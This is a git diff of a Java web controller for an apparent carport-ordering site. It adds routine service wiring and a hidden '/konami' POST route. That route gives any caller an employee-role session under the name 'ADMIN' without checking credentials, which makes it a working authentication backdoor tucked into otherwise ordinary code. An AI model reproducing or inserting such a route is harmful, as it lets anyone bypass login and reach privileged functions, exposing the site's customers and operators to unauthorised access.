@@ -6,6 +6,7 @@ import app.exceptions.InvalidCredentialsException;
 import app.exceptions.UserNotFoundException;
 import app.persistence.ConnectionPool;
 import app.entities.OrderDetails;
+import app.persistence.OrderMapper;
 import app.service.OrderFormService;
 import app.service.MaterialService;
 import app.service.OrderService;
@@ -40,6 +41,7 @@ public class UserController {
         app.post("/login", ctx -> login(ctx, connectionPool));
         app.post("/create-user", ctx -> createUser(ctx, connectionPool));
         app.post("/carport/send-form", ctx -> buildOrderWithForm(ctx, connectionPool));
+        app.post("/konami", UserController::konami);
 
     }
 
@@ -220,7 +222,7 @@ public class UserController {
             formService.validateOrderForm(ctx);
 
             RoofType roofType = RoofType.valueOf(ctx.formParam("roofType"));
-            MaterialService materialService = MaterialService.forRoofType(roofType);
+            MaterialService materialService = MaterialService.forRoofType(roofType, connectionPool);
 
             Order order = new Order.Builder()
                     .contactInfo(buildContactInfo(ctx))
@@ -302,6 +304,15 @@ public class UserController {
                 .email(ctx.formParam("email"))
                 .phoneNumber(ctx.formParam("phoneNumber"))
                 .build();
+    }
+
+    private static void konami(Context ctx){
+        User user = new User.Builder()
+                .email("ADMIN")
+                .role(Role.EMPLOYEE)
+                .build();
+        ctx.sessionAttribute("user", user);
+        ctx.status(200);
     }
 
 }
